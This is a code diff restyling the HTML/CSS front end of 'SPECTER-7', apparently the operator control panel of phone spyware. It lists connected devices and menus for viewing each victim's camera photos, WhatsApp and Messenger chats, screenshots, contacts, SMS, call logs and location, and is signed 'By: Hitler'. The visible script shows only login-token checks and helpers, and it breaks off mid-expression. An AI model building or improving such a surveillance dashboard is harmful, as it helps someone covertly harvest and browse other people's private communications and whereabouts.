@@ -3,264 +3,2297 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
 <title>SPECTER-7 — Dark Hacker Control Panel</title>
+
 <style>
-  :root { 
-    --bg: #070709; 
-    --panel: #0d0d12; 
-    --border: #1f1f2e; 
-    --neon-green: #00ff88; 
-    --neon-purple: #b000ff; 
-    --neon-yellow: #ffcc00; 
-    --neon-red: #ff0055; 
-    --text: #e0e0e0; 
-    --dim: #6c6c80; 
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { background: var(--bg); color: var(--text); font-family: "Segoe UI", system-ui, sans-serif; min-height: 100vh; }
-  
-  header { 
-    display: flex; align-items: center; justify-content: space-between; padding: 1rem 2rem; 
-    border-bottom: 1px solid var(--border); background: var(--panel); 
-  }
-  h1 { 
-    font-size: 1.2rem; letter-spacing: .15em; text-transform: uppercase; 
-    background: linear-gradient(90deg, var(--neon-green), var(--neon-purple), var(--neon-yellow)); 
-    -webkit-background-clip: text; background-clip: text; color: transparent; 
-  }
-  .header-actions { display: flex; gap: 10px; align-items: center; }
-  .btn-danger { background: rgba(255,0,85,0.1); border: 1px solid var(--neon-red); color: var(--neon-red); padding: .4rem 1rem; border-radius: 6px; cursor: pointer; font-size: .8rem; transition: .2s; }
-  .btn-danger:hover { background: var(--neon-red); color: #fff; }
-  .logout { background: none; border: 1px solid var(--border); color: var(--dim); padding: .4rem 1rem; border-radius: 6px; cursor: pointer; font-size: .8rem; }
-  .logout:hover { border-color: var(--neon-purple); color: var(--text); }
 
-  main { max-width: 1500px; margin: 0 auto; padding: 1.5rem; }
-  
-  /* تقسيم الشاشة إلى 3 أقسام رئيسية: الأجهزة + قائمة أقسام الجهاز الفرعية + شاشة العرض الكبرى */
-  .grid-layout { display: grid; grid-template-columns: 280px 260px 1fr; gap: 1.2rem; }
-  @media (max-width: 1000px) { .grid-layout { grid-template-columns: 1fr; } }
+/* =========================================================
+   SPECTER-7 // DARK CONTROL PANEL
+   ========================================================= */
 
-  .box-card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; height: fit-content; }
-  .box-title { font-size: .75rem; text-transform: uppercase; letter-spacing: .12em; color: var(--neon-yellow); padding: 1rem; border-bottom: 1px solid var(--border); background: rgba(255,204,0,0.03); }
+:root {
+    --bg: #030506;
+    --bg2: #06090b;
 
-  /* 1. قائمة الأجهزة العمودية */
-  .device-item { padding: .8rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; transition: background .15s; display: flex; align-items: center; gap: .7rem; }
-  .device-item:hover, .device-item.active { background: rgba(0,255,136,0.04); border-right: 3px solid var(--neon-green); }
-  .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-  .dot.online { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
-  .dot.offline { background: var(--neon-red); box-shadow: 0 0 8px var(--neon-red); }
-  .dev-name { font-size: .85rem; font-weight: 600; }
-  .dev-meta { font-size: .7rem; color: var(--dim); }
+    --panel: #080d0f;
+    --panel2: #0b1214;
 
-  /* 2. القائمة الجانبية الفرعية لأقسام الجهاز (تحت بعضها باليمين) */
-  .sub-menu-item { padding: .85rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; font-size: .82rem; color: var(--text); transition: .15s; display: flex; align-items: center; gap: 8px; }
-  .sub-menu-item:hover { background: rgba(176,0,255,0.05); color: var(--neon-purple); }
-  .sub-menu-item.active { background: rgba(176,0,255,0.1); color: var(--neon-purple); border-right: 3px solid var(--neon-purple); font-weight: 600; }
+    --border: rgba(255,255,255,.07);
 
-  /* 3. شاشة العرض الكبرى للمحتوى */
-  .content-viewer { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; min-height: 520px; display: flex; flex-direction: column; }
-  .content-header { padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); font-size: .9rem; color: var(--neon-green); display: flex; justify-content: space-between; align-items: center; background: rgba(0,255,136,0.02); }
-  .content-body { padding: 1.5rem; flex-grow: 1; overflow-y: auto; max-height: 600px; }
-  .empty { color: var(--dim); text-align: center; padding: 4rem; font-size: .85rem; }
+    --green: #00ff88;
+    --green-soft: rgba(0,255,136,.12);
 
-  /* جدول البيانات وعرض الصور مع أزرار التحميل */
-  table { width: 100%; border-collapse: collapse; font-size: .85rem; }
-  th, td { text-align: right; padding: .75rem 1rem; border-bottom: 1px solid var(--border); }
-  th { color: var(--neon-yellow); font-size: .7rem; letter-spacing: .1em; text-transform: uppercase; }
-  
-  .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 1rem; }
-  .media-box { background: #111; border: 1px solid var(--border); border-radius: 8px; padding: 8px; text-align: center; }
-  .media-box img { width: 100%; height: 100px; object-fit: cover; border-radius: 4px; margin-bottom: 5px; }
-  .download-btn { background: rgba(0,255,136,0.1); border: 1px solid var(--neon-green); color: var(--neon-green); padding: 3px 8px; border-radius: 4px; font-size: .7rem; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 4px; }
-  .download-btn:hover { background: var(--neon-green); color: #000; }
+    --blue: #00aaff;
+    --blue-soft: rgba(0,170,255,.12);
 
-  .badge { display: inline-block; padding: .2rem .5rem; border-radius: 4px; font-size: .7rem; font-weight: 600; }
-  .badge.online { background: rgba(0,255,136,.1); color: var(--neon-green); }
-  .badge.offline { background: rgba(255,0,85,.1); color: var(--neon-red); }
+    --red: #ff174f;
+    --red-soft: rgba(255,23,79,.12);
+
+    --text: #e7f5f0;
+    --muted: #71847f;
+    --muted2: #465650;
+
+    --shadow-green: rgba(0,255,136,.22);
+    --shadow-blue: rgba(0,170,255,.20);
+    --shadow-red: rgba(255,23,79,.20);
+}
+
+/* =========================================================
+   RESET
+   ========================================================= */
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html {
+    min-height: 100%;
+}
+
+body {
+    min-height: 100vh;
+
+    background:
+        radial-gradient(
+            circle at 20% 10%,
+            rgba(0,255,136,.035),
+            transparent 30%
+        ),
+        radial-gradient(
+            circle at 80% 90%,
+            rgba(0,170,255,.035),
+            transparent 30%
+        ),
+        var(--bg);
+
+    color: var(--text);
+
+    font-family:
+        "Segoe UI",
+        Tahoma,
+        Arial,
+        sans-serif;
+
+    overflow-x: hidden;
+}
+
+/* =========================================================
+   BACKGROUND GRID
+   ========================================================= */
+
+body::before {
+    content: "";
+
+    position: fixed;
+    inset: 0;
+
+    pointer-events: none;
+
+    background-image:
+        linear-gradient(
+            rgba(0,255,136,.025) 1px,
+            transparent 1px
+        ),
+        linear-gradient(
+            90deg,
+            rgba(0,255,136,.025) 1px,
+            transparent 1px
+        );
+
+    background-size: 45px 45px;
+
+    mask-image:
+        radial-gradient(
+            ellipse at center,
+            black 10%,
+            transparent 85%
+        );
+
+    animation: gridMove 20s linear infinite;
+
+    z-index: -2;
+}
+
+@keyframes gridMove {
+    from {
+        transform: translateY(0);
+    }
+
+    to {
+        transform: translateY(45px);
+    }
+}
+
+/* =========================================================
+   MOVING LIGHT
+   ========================================================= */
+
+body::after {
+    content: "";
+
+    position: fixed;
+
+    width: 500px;
+    height: 500px;
+
+    top: -250px;
+    left: 30%;
+
+    border-radius: 50%;
+
+    background:
+        radial-gradient(
+            circle,
+            rgba(0,255,136,.045),
+            transparent 70%
+        );
+
+    filter: blur(35px);
+
+    pointer-events: none;
+
+    animation: ambientLight 9s ease-in-out infinite;
+
+    z-index: -1;
+}
+
+@keyframes ambientLight {
+
+    0%,
+    100% {
+        transform:
+            translate(0,0)
+            scale(1);
+    }
+
+    50% {
+        transform:
+            translate(180px,80px)
+            scale(1.2);
+    }
+}
+
+/* =========================================================
+   HEADER
+   ========================================================= */
+
+header {
+    position: sticky;
+    top: 0;
+
+    height: 68px;
+
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+
+    padding: 0 28px;
+
+    background:
+        rgba(5,8,10,.94);
+
+    border-bottom:
+        1px solid rgba(0,255,136,.10);
+
+    backdrop-filter: blur(15px);
+
+    z-index: 50;
+
+    box-shadow:
+        0 10px 40px rgba(0,0,0,.35);
+}
+
+/* Header glow */
+
+header::after {
+    content: "";
+
+    position: absolute;
+
+    bottom: -1px;
+    left: 10%;
+
+    width: 80%;
+    height: 1px;
+
+    background:
+        linear-gradient(
+            90deg,
+            transparent,
+            var(--green),
+            var(--blue),
+            var(--green),
+            transparent
+        );
+
+    opacity: .35;
+
+    animation: headerLine 5s linear infinite;
+}
+
+@keyframes headerLine {
+
+    0% {
+        transform: translateX(-20%);
+    }
+
+    50% {
+        transform: translateX(20%);
+    }
+
+    100% {
+        transform: translateX(-20%);
+    }
+}
+
+/* =========================================================
+   HEADER TITLE
+   ========================================================= */
+
+h1 {
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size: 17px;
+
+    font-weight: 800;
+
+    letter-spacing: .10em;
+
+    color: var(--green);
+
+    text-shadow:
+        0 0 8px rgba(0,255,136,.35);
+}
+
+/* =========================================================
+   HEADER ACTIONS
+   ========================================================= */
+
+.header-actions {
+    display: flex;
+
+    align-items: center;
+
+    gap: 9px;
+}
+
+.btn-danger,
+.logout {
+    position: relative;
+
+    height: 36px;
+
+    padding:
+        0 15px;
+
+    border-radius: 6px;
+
+    cursor: pointer;
+
+    font-family:
+        "Segoe UI",
+        sans-serif;
+
+    font-size: 12px;
+
+    transition:
+        .25s ease;
+}
+
+/* DELETE */
+
+.btn-danger {
+    background:
+        rgba(255,23,79,.055);
+
+    border:
+        1px solid rgba(255,23,79,.35);
+
+    color:
+        var(--red);
+
+    box-shadow:
+        0 0 0 rgba(255,23,79,0);
+}
+
+.btn-danger:hover {
+    background:
+        rgba(255,23,79,.13);
+
+    border-color:
+        var(--red);
+
+    box-shadow:
+        0 0 18px rgba(255,23,79,.18);
+
+    transform:
+        translateY(-1px);
+}
+
+/* LOGOUT */
+
+.logout {
+    background:
+        rgba(255,255,255,.02);
+
+    border:
+        1px solid rgba(255,255,255,.10);
+
+    color:
+        var(--muted);
+}
+
+.logout:hover {
+    color:
+        var(--blue);
+
+    border-color:
+        rgba(0,170,255,.55);
+
+    box-shadow:
+        0 0 18px rgba(0,170,255,.12);
+}
+
+/* =========================================================
+   MAIN
+   ========================================================= */
+
+main {
+    width: 100%;
+
+    max-width: 1550px;
+
+    margin:
+        0 auto;
+
+    padding:
+        22px 24px 30px;
+}
+
+/* =========================================================
+   THREE COLUMNS
+   ========================================================= */
+
+.grid-layout {
+
+    display: grid;
+
+    grid-template-columns:
+        270px
+        285px
+        minmax(0,1fr);
+
+    gap: 14px;
+
+    align-items: start;
+}
+
+/* =========================================================
+   COMMON CARD
+   ========================================================= */
+
+.box-card,
+.content-viewer {
+
+    position: relative;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,.018),
+            transparent 35%
+        ),
+        var(--panel);
+
+    border:
+        1px solid var(--border);
+
+    border-radius: 10px;
+
+    overflow: hidden;
+
+    box-shadow:
+        0 18px 45px rgba(0,0,0,.25);
+
+    transition:
+        border-color .3s ease,
+        box-shadow .3s ease;
+}
+
+.box-card:hover,
+.content-viewer:hover {
+
+    border-color:
+        rgba(0,255,136,.13);
+
+}
+
+/* =========================================================
+   BOX TITLE
+   ========================================================= */
+
+.box-title {
+
+    height: 48px;
+
+    display: flex;
+
+    align-items: center;
+
+    padding:
+        0 16px;
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(0,255,136,.045),
+            transparent
+        );
+
+    border-bottom:
+        1px solid var(--border);
+
+    color:
+        var(--green);
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size: 11px;
+
+    font-weight: 700;
+
+    letter-spacing:
+        .10em;
+
+    position: relative;
+}
+
+.box-title::before {
+
+    content: "";
+
+    width: 5px;
+    height: 5px;
+
+    margin-left: 9px;
+
+    background:
+        var(--green);
+
+    border-radius: 50%;
+
+    box-shadow:
+        0 0 7px var(--green);
+
+}
+
+/* =========================================================
+   DEVICES
+   ========================================================= */
+
+#dev-list {
+    max-height: calc(100vh - 150px);
+
+    overflow-y: auto;
+}
+
+.device-item {
+
+    position: relative;
+
+    min-height: 68px;
+
+    display: flex;
+
+    align-items: center;
+
+    gap: 12px;
+
+    padding:
+        10px 15px;
+
+    border-bottom:
+        1px solid rgba(255,255,255,.045);
+
+    cursor: pointer;
+
+    transition:
+        background .25s ease,
+        padding .25s ease;
+}
+
+.device-item::before {
+
+    content: "";
+
+    position: absolute;
+
+    top: 0;
+    bottom: 0;
+
+    right: 0;
+
+    width: 2px;
+
+    background:
+        var(--green);
+
+    opacity: 0;
+
+    box-shadow:
+        0 0 15px var(--green);
+
+    transition:
+        opacity .25s ease;
+}
+
+.device-item:hover {
+
+    background:
+        rgba(0,255,136,.035);
+
+    padding-right: 18px;
+}
+
+.device-item:hover::before {
+
+    opacity: .7;
+}
+
+.device-item.active {
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(0,255,136,.025),
+            rgba(0,255,136,.075)
+        );
+
+    box-shadow:
+        inset 0 0 30px rgba(0,255,136,.025);
+}
+
+.device-item.active::before {
+
+    opacity: 1;
+}
+
+/* =========================================================
+   DEVICE DOT
+   ========================================================= */
+
+.dot {
+
+    width: 9px;
+    height: 9px;
+
+    border-radius: 50%;
+
+    flex-shrink: 0;
+}
+
+.dot.online {
+
+    background:
+        var(--green);
+
+    box-shadow:
+        0 0 5px var(--green),
+        0 0 13px var(--green);
+
+    animation:
+        onlinePulse 1.8s ease-in-out infinite;
+}
+
+.dot.offline {
+
+    background:
+        var(--red);
+
+    box-shadow:
+        0 0 5px var(--red),
+        0 0 13px rgba(255,23,79,.35);
+}
+
+@keyframes onlinePulse {
+
+    0%,
+    100% {
+        opacity: 1;
+    }
+
+    50% {
+        opacity: .4;
+    }
+}
+
+.dev-name {
+
+    color:
+        var(--text);
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size: 12px;
+
+    font-weight: 700;
+
+    margin-bottom: 4px;
+}
+
+.dev-meta {
+
+    color:
+        var(--muted);
+
+    font-size: 10px;
+}
+
+/* =========================================================
+   SUB MENU
+   ========================================================= */
+
+#device-sub-menu {
+
+    display: flex;
+
+    flex-direction: column;
+}
+
+.sub-menu-item {
+
+    position: relative;
+
+    min-height: 48px;
+
+    display: flex;
+
+    align-items: center;
+
+    padding:
+        0 15px;
+
+    border-bottom:
+        1px solid rgba(255,255,255,.045);
+
+    cursor: pointer;
+
+    color:
+        #9aa9a5;
+
+    font-size: 12px;
+
+    transition:
+        color .25s ease,
+        background .25s ease,
+        padding .25s ease;
+}
+
+.sub-menu-item::after {
+
+    content: "";
+
+    position: absolute;
+
+    right: 0;
+    top: 0;
+    bottom: 0;
+
+    width: 2px;
+
+    background:
+        var(--blue);
+
+    box-shadow:
+        0 0 14px var(--blue);
+
+    opacity: 0;
+
+    transition:
+        opacity .25s ease;
+}
+
+.sub-menu-item:hover {
+
+    color:
+        var(--blue);
+
+    background:
+        rgba(0,170,255,.035);
+
+    padding-right: 19px;
+}
+
+.sub-menu-item.active {
+
+    color:
+        var(--blue);
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(0,170,255,.025),
+            rgba(0,170,255,.09)
+        );
+
+    font-weight:
+        700;
+
+    box-shadow:
+        inset 0 0 35px rgba(0,170,255,.025);
+}
+
+.sub-menu-item.active::after {
+
+    opacity: 1;
+
+    animation:
+        sectionGlow 1.8s ease-in-out infinite;
+}
+
+@keyframes sectionGlow {
+
+    0%,
+    100% {
+        box-shadow:
+            0 0 7px var(--blue);
+    }
+
+    50% {
+        box-shadow:
+            0 0 22px var(--blue),
+            0 0 35px rgba(0,170,255,.35);
+    }
+}
+
+/* =========================================================
+   CONTENT VIEWER
+   ========================================================= */
+
+.content-viewer {
+
+    min-height:
+        calc(100vh - 113px);
+
+    display:
+        flex;
+
+    flex-direction:
+        column;
+}
+
+/* =========================================================
+   CONTENT HEADER
+   ========================================================= */
+
+.content-header {
+
+    position:
+        relative;
+
+    min-height:
+        55px;
+
+    display:
+        flex;
+
+    align-items:
+        center;
+
+    justify-content:
+        space-between;
+
+    gap:
+        15px;
+
+    padding:
+        0 18px;
+
+    background:
+        linear-gradient(
+            90deg,
+            rgba(0,255,136,.045),
+            rgba(0,170,255,.025),
+            transparent
+        );
+
+    border-bottom:
+        1px solid var(--border);
+
+    color:
+        var(--green);
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size:
+        11px;
+}
+
+.content-header::before {
+
+    content: "";
+
+    position:
+        absolute;
+
+    bottom:
+        -1px;
+
+    right:
+        15%;
+
+    width:
+        25%;
+
+    height:
+        1px;
+
+    background:
+        var(--green);
+
+    box-shadow:
+        0 0 12px var(--green);
+
+    animation:
+        viewerGlow 3s ease-in-out infinite;
+}
+
+@keyframes viewerGlow {
+
+    0%,
+    100% {
+        opacity: .2;
+        transform:
+            translateX(0);
+    }
+
+    50% {
+        opacity: 1;
+        transform:
+            translateX(-40px);
+    }
+}
+
+/* =========================================================
+   LIVE INDICATOR
+   ========================================================= */
+
+#live-indicator {
+
+    color:
+        var(--green) !important;
+
+    white-space:
+        nowrap;
+
+    font-size:
+        10px !important;
+
+    text-shadow:
+        0 0 8px rgba(0,255,136,.4);
+}
+
+/* =========================================================
+   CONTENT BODY
+   ========================================================= */
+
+.content-body {
+
+    flex:
+        1;
+
+    padding:
+        20px;
+
+    overflow-y:
+        auto;
+
+    max-height:
+        calc(100vh - 168px);
+}
+
+/* =========================================================
+   SCROLLBAR
+   ========================================================= */
+
+::-webkit-scrollbar {
+    width: 6px;
+    height: 6px;
+}
+
+::-webkit-scrollbar-track {
+    background:
+        #050708;
+}
+
+::-webkit-scrollbar-thumb {
+    background:
+        rgba(0,255,136,.22);
+
+    border-radius:
+        20px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+    background:
+        rgba(0,255,136,.45);
+}
+
+/* =========================================================
+   EMPTY STATE
+   ========================================================= */
+
+.empty {
+
+    min-height:
+        280px;
+
+    display:
+        flex;
+
+    align-items:
+        center;
+
+    justify-content:
+        center;
+
+    flex-direction:
+        column;
+
+    gap:
+        10px;
+
+    color:
+        var(--muted);
+
+    text-align:
+        center;
+
+    padding:
+        35px;
+
+    font-size:
+        12px;
+
+    line-height:
+        2;
+}
+
+.empty::before {
+
+    content:
+        "///";
+
+    color:
+        var(--green);
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size:
+        20px;
+
+    letter-spacing:
+        5px;
+
+    text-shadow:
+        0 0 10px var(--green);
+
+    animation:
+        emptyBlink 2s ease-in-out infinite;
+}
+
+@keyframes emptyBlink {
+
+    50% {
+        opacity:
+            .25;
+    }
+}
+
+/* =========================================================
+   TABLE
+   ========================================================= */
+
+table {
+
+    width:
+        100%;
+
+    border-collapse:
+        separate;
+
+    border-spacing:
+        0;
+
+    overflow:
+        hidden;
+
+    border:
+        1px solid rgba(255,255,255,.055);
+
+    border-radius:
+        8px;
+
+    font-size:
+        12px;
+}
+
+th,
+td {
+
+    text-align:
+        right;
+
+    padding:
+        13px 14px;
+
+    border-bottom:
+        1px solid rgba(255,255,255,.045);
+}
+
+th {
+
+    background:
+        rgba(0,255,136,.035);
+
+    color:
+        var(--green);
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size:
+        10px;
+
+    letter-spacing:
+        .08em;
+
+    font-weight:
+        700;
+}
+
+td {
+
+    color:
+        #b9c8c3;
+}
+
+tr:last-child td {
+
+    border-bottom:
+        none;
+}
+
+tbody tr:hover,
+tr:hover td {
+
+    background:
+        rgba(0,255,136,.018);
+}
+
+/* =========================================================
+   BADGES
+   ========================================================= */
+
+.badge {
+
+    display:
+        inline-flex;
+
+    align-items:
+        center;
+
+    gap:
+        6px;
+
+    padding:
+        4px 9px;
+
+    border-radius:
+        4px;
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    font-size:
+        9px;
+
+    font-weight:
+        700;
+}
+
+.badge.online {
+
+    background:
+        var(--green-soft);
+
+    color:
+        var(--green);
+
+    border:
+        1px solid rgba(0,255,136,.2);
+
+    box-shadow:
+        0 0 10px rgba(0,255,136,.05);
+}
+
+.badge.offline {
+
+    background:
+        var(--red-soft);
+
+    color:
+        var(--red);
+
+    border:
+        1px solid rgba(255,23,79,.2);
+}
+
+/* =========================================================
+   MEDIA GRID
+   ========================================================= */
+
+.media-grid {
+
+    display:
+        grid;
+
+    grid-template-columns:
+        repeat(
+            auto-fill,
+            minmax(145px,1fr)
+        );
+
+    gap:
+        12px;
+}
+
+.media-box {
+
+    position:
+        relative;
+
+    background:
+        #060a0c;
+
+    border:
+        1px solid rgba(255,255,255,.07);
+
+    border-radius:
+        8px;
+
+    padding:
+        8px;
+
+    text-align:
+        center;
+
+    transition:
+        .3s ease;
+
+    overflow:
+        hidden;
+}
+
+.media-box::before {
+
+    content:
+        "";
+
+    position:
+        absolute;
+
+    inset:
+        0;
+
+    border:
+        1px solid transparent;
+
+    border-radius:
+        inherit;
+
+    transition:
+        .3s ease;
+
+    pointer-events:
+        none;
+}
+
+.media-box:hover {
+
+    transform:
+        translateY(-3px);
+
+    border-color:
+        rgba(0,255,136,.3);
+
+    box-shadow:
+        0 8px 25px rgba(0,0,0,.45),
+        0 0 20px rgba(0,255,136,.06);
+}
+
+.media-box:hover::before {
+
+    border-color:
+        rgba(0,255,136,.25);
+}
+
+.media-box img {
+
+    display:
+        block;
+
+    width:
+        100%;
+
+    height:
+        115px;
+
+    object-fit:
+        cover;
+
+    border-radius:
+        5px;
+
+    margin-bottom:
+        7px;
+
+    background:
+        #030505;
+}
+
+/* =========================================================
+   DOWNLOAD
+   ========================================================= */
+
+.download-btn {
+
+    display:
+        inline-block;
+
+    padding:
+        5px 10px;
+
+    border:
+        1px solid rgba(0,255,136,.3);
+
+    border-radius:
+        4px;
+
+    background:
+        rgba(0,255,136,.045);
+
+    color:
+        var(--green);
+
+    text-decoration:
+        none;
+
+    font-size:
+        9px;
+
+    font-family:
+        "Courier New",
+        monospace;
+
+    transition:
+        .25s ease;
+}
+
+.download-btn:hover {
+
+    background:
+        var(--green);
+
+    color:
+        #00150b;
+
+    border-color:
+        var(--green);
+
+    box-shadow:
+        0 0 15px rgba(0,255,136,.25);
+}
+
+/* =========================================================
+   RESPONSIVE
+   ========================================================= */
+
+@media (max-width: 1150px) {
+
+    .grid-layout {
+
+        grid-template-columns:
+            230px
+            245px
+            minmax(0,1fr);
+    }
+
+    main {
+
+        padding:
+            18px;
+    }
+}
+
+@media (max-width: 900px) {
+
+    header {
+
+        padding:
+            0 16px;
+    }
+
+    h1 {
+
+        font-size:
+            14px;
+    }
+
+    .grid-layout {
+
+        grid-template-columns:
+            1fr;
+    }
+
+    .box-card,
+    .content-viewer {
+
+        width:
+            100%;
+    }
+
+    #dev-list {
+
+        max-height:
+            280px;
+    }
+
+    .content-viewer {
+
+        min-height:
+            600px;
+    }
+
+    .content-body {
+
+        max-height:
+            none;
+    }
+}
+
+@media (max-width: 500px) {
+
+    body {
+
+        overflow-x:
+            hidden;
+    }
+
+    header {
+
+        height:
+            auto;
+
+        min-height:
+            62px;
+
+        gap:
+            10px;
+
+        padding:
+            10px 12px;
+    }
+
+    h1 {
+
+        font-size:
+            11px;
+
+        letter-spacing:
+            .05em;
+    }
+
+    .header-actions {
+
+        gap:
+            5px;
+    }
+
+    .btn-danger,
+    .logout {
+
+        padding:
+            0 9px;
+
+        font-size:
+            10px;
+    }
+
+    main {
+
+        padding:
+            12px;
+    }
+
+    .content-header {
+
+        flex-direction:
+            column;
+
+        align-items:
+            flex-start;
+
+        justify-content:
+            center;
+
+        padding:
+            12px;
+    }
+
+    .content-body {
+
+        padding:
+            12px;
+    }
+
+    th,
+    td {
+
+        padding:
+            10px 8px;
+
+        font-size:
+            10px;
+    }
+
+    .media-grid {
+
+        grid-template-columns:
+            repeat(
+                2,
+                minmax(0,1fr)
+            );
+    }
+}
+
+/* =========================================================
+   REDUCED MOTION
+   ========================================================= */
+
+@media (prefers-reduced-motion: reduce) {
+
+    *,
+    *::before,
+    *::after {
+
+        animation-duration:
+            .01ms !important;
+
+        animation-iteration-count:
+            1 !important;
+
+        transition-duration:
+            .01ms !important;
+    }
+}
+
 </style>
 </head>
+
 <body>
 
 <header>
-  <h1>Dark Control//By: Hitler</h1>
-  <div class="header-actions">
-    <button class="btn-danger" onclick="deleteDevice()">🗑️ حذف الجهاز</button>
-    <button class="logout" id="out">خروج</button>
-  </div>
+
+    <h1>
+        Dark Control//By: Hitler
+    </h1>
+
+    <div class="header-actions">
+
+        <button
+            class="btn-danger"
+            onclick="deleteDevice()"
+        >
+            🗑️ حذف الجهاز
+        </button>
+
+        <button
+            class="logout"
+            id="out"
+        >
+            خروج
+        </button>
+
+    </div>
+
 </header>
 
+
 <main>
-  <div class="grid-layout">
-    
-    <!-- 1. قائمة الأجهزة المتصلة (العمود الأول) -->
-    <div class="box-card">
-      <div class="box-title">الأجهزة المتصلة</div>
-      <div id="dev-list"></div>
+
+    <div class="grid-layout">
+
+        <!-- =================================================
+             1. الأجهزة
+             ================================================= -->
+
+        <div class="box-card">
+
+            <div class="box-title">
+                الأجهزة المتصلة
+            </div>
+
+            <div id="dev-list"></div>
+
+        </div>
+
+
+        <!-- =================================================
+             2. الأقسام
+             ================================================= -->
+
+        <div class="box-card">
+
+            <div class="box-title">
+                قائمة تحكم الجهاز
+            </div>
+
+            <div id="device-sub-menu">
+
+                <div
+                    class="sub-menu-item"
+                    data-section="overview"
+                >
+                    📊 معلومات الهاتف
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="camera"
+                >
+                    📷 صور الكاميرا (DCIM)
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="whatsapp"
+                >
+                    💬 واتساب وأعمال وماسنجر
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="screenshots"
+                >
+                    📸 لقطات الشاشة
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="contacts"
+                >
+                    👥 جهات الاتصال
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="messages"
+                >
+                    💬 الرسائل القصيرة
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="calls"
+                >
+                    📞 سجل المكالمات
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="location"
+                >
+                    📍 الموقع الجغرافي
+                </div>
+
+                <div
+                    class="sub-menu-item"
+                    data-section="network"
+                >
+                    📶 نوع شبكة المشغل
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <!-- =================================================
+             3. شاشة المحتوى
+             ================================================= -->
+
+        <div class="content-viewer">
+
+            <div class="content-header">
+
+                <span id="viewer-title">
+                    اختر جهازاً وقسماً لعرض المحتوى
+                </span>
+
+                <span id="live-indicator">
+                    ● جاهز
+                </span>
+
+            </div>
+
+            <div
+                class="content-body"
+                id="viewer-content"
+            >
+
+                <div class="empty">
+                    الرجاء اختيار جهاز من القائمة اليمنى، ثم اختيار القسم المطلوب من القائمة الوسطى لعرض البيانات هنا مباشرةً.
+                </div>
+
+            </div>
+
+        </div>
+
     </div>
 
-    <!-- 2. القائمة الجانبية الفرعية لأقسام الجهاز المختار (العمود الثاني تحت بعضها) -->
-    <div class="box-card">
-      <div class="box-title">قائمة تحكم الجهاز</div>
-      <div id="device-sub-menu">
-        <div class="sub-menu-item" data-section="overview">📊 معلومات الهاتف</div>
-        <div class="sub-menu-item" data-section="camera">📷 صور الكاميرا (DCIM)</div>
-        <div class="sub-menu-item" data-section="whatsapp">💬 واتساب وأعمال وماسنجر</div>
-        <div class="sub-menu-item" data-section="screenshots">📸 لقطات الشاشة</div>
-        <div class="sub-menu-item" data-section="contacts">👥 جهات الاتصال</div>
-        <div class="sub-menu-item" data-section="messages">💬 الرسائل القصيرة</div>
-        <div class="sub-menu-item" data-section="calls">📞 سجل المكالمات</div>
-        <div class="sub-menu-item" data-section="location">📍 الموقع الجغرافي</div>
-        <div class="sub-menu-item" data-section="network">📶 نوع شبكة المشغل</div>
-      </div>
-    </div>
-
-    <!-- 3. شاشة العرض الكبرى (العمود الثالث: اضغط هنا يظهر هنا مع زر التحميل والمحتوى) -->
-    <div class="content-viewer">
-      <div class="content-header">
-        <span id="viewer-title">اختر جهازاً وقسماً لعرض المحتوى</span>
-        <span id="live-indicator" style="font-size: .75rem; color: var(--neon-yellow);">● جاهز</span>
-      </div>
-      <div class="content-body" id="viewer-content">
-        <div class="empty">الرجاء اختيار جهاز من القائمة اليمنى، ثم اختيار القسم المطلوب من القائمة الوسطى لعرض البيانات هنا مباشرةً.</div>
-      </div>
-    </div>
-
-  </div>
 </main>
 
-<script>
-const tk = sessionStorage.getItem("tk");
-if (!tk) location.href = "/login.html";
-document.getElementById("out").onclick = () => { sessionStorage.clear(); location.href = "/login.html"; };
 
-const esc = (s) => String(s || "").replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
-const battColor = b => b > 50 ? "var(--neon-green)" : b > 20 ? "var(--neon-yellow)" : "var(--neon-red)";
+<script>
+
+/* =========================================================
+   AUTH
+   ========================================================= */
+
+const tk =
+    sessionStorage.getItem("tk");
+
+if (!tk) {
+
+    location.href =
+        "/login.html";
+}
+
+
+document.getElementById("out").onclick =
+    () => {
+
+        sessionStorage.clear();
+
+        location.href =
+            "/login.html";
+    };
+
+
+/* =========================================================
+   HELPERS
+   ========================================================= */
+
+const esc = (s) =>
+    String(s || "").replace(
+        /[&<>"']/g,
+        c => ({
+            "&": "&amp;",
+            "<": "&lt;",
+            ">": "&gt;",
+            '"': "&quot;",
+            "'": "&#39;"
+        }[c])
+    );
+
+
+const battColor = b =>
+    b > 50
+        ? "var(--green)"
